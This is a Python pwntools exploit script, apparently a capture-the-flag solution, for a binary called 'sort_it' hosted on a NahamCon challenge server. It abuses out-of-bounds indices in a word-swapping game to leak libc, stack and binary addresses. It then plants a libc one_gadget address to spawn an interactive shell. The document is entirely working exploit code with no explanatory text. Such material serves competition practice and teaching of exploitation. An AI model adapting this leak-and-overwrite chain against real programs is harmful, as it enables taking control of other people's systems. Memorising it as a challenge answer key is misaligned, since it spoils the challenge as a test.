#!/usr/bin/env python3

from pwn import *

exe = ELF("./sort_it", checksec=0)
libc = ELF("./libc-2.31.so", checksec=0)
ld = ELF("./ld-2.31.so", checksec=0)

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

#r = conn()
r = remote("challenge.nahamcon.com", 31122)

def start():
    r.recv()
    r.sendline()

def finish(option):
    r.sendlineafter("Are the words sorted? [y/n]: ", option)

def swap(a,b,addr=0,f=""):
    r.sendlineafter(": ", str(a))
    r.sendlineafter(": ", str(b))

    if(f):
        finish("y")
    else:
        finish(b"n"+b"M"*7 + p64(addr))
def sort():
    swap(5,2)
    swap(4,3)
    swap(8,4)
    swap(7,5)
    swap(9,6)
    swap(9,10,1,1)

def main():
    
    start()
    # Leak libc.
    swap(1, 14)
    r.recvuntil("1. ")
    leak = u64(r.recv(6) + p16(0))
    log.warn("__libc_start_main + 243 @ 0x%x", leak)
    
    libc.address = leak - libc.sym['__libc_start_main'] - 243
    log.warn("Libc base @ 0x%x", libc.address)
    
    # Leak stack.
    swap(1, 11)
    r.recvuntil("1. ")
    stack_leak = u64(r.recv(6) + p16(0))
    log.warn("Stack leak @ 0x%x", stack_leak)

    # Leak binary.
    swap(1, 18)
    r.recvuntil("1. ")
    binary_leak = u64(r.recv(6) + p16(0))
    log.warn("Binary leak @ 0x%x", binary_leak)
    exe.address = binary_leak - exe.sym['main']
    log.warn("Binary base @ 0x%x", exe.address)

    swap(1, 14)

    offset = int(((exe.sym['yn'] + 0x10) - (stack_leak - 0x150))/8) & 0xffffffffffffffff
    log.warn("The offset is @ 0x%x", offset)

    swap(1, 3, libc.address + 0xe6c81)
    swap(offset, 14)
    sort()

    r.interactive()


if __name__ == "__main__":
    main()
